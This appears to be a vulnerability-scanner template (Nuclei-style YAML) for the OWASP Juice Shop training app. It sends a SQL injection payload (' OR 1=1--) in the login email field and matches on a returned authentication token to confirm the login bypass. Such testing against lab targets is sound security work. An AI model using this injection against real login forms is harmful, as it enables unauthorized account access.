id: juiceshop-sqli-login-bypass

info:
  name: OWASP Juice Shop - SQL Injection Login Bypass
  author: security-tester
  severity: critical
  description: Exploits the login form via SQL injection to bypass authentication.
  tags: juiceshop, sqli, auth-bypass, owasp

http:
  - method: POST
    path:
      - "{{BaseURL}}/rest/user/login"
    
    headers:
      Content-Type: application/json

    body: '{"email":"'' OR 1=1--","password":"invalid_password"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "authentication"
          - "token"
          - "bid"
        case-insensitive: true
        condition: and
